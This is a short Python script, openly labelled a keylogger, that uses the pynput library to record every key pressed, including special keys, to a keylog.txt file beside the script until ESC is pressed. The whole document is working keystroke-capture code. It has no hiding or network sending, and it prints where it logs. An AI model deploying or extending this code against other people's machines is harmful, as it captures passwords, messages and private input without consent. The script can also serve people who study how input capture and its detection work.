from pynput import keyboard
import os

# Get the directory where the script is located
log_file = os.path.join(os.path.dirname(os.path.abspath(__file__)), "keylog.txt")

# Open the log file in append mode
def write_to_log(key):
    with open(log_file, "a") as f:
        try:
            if key.char:
                f.write(key.char)
        except AttributeError:
            # Handle special keys (like enter, backspace)
            f.write(f'[{key}]')

def on_press(key):
    write_to_log(key)

def on_release(key):
    # Press ESC to stop the keylogger
    if key == keyboard.Key.esc:
        return False

def main():
    print(f"Logging to: {log_file}")
    with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()

if __name__ == "__main__":
    main()
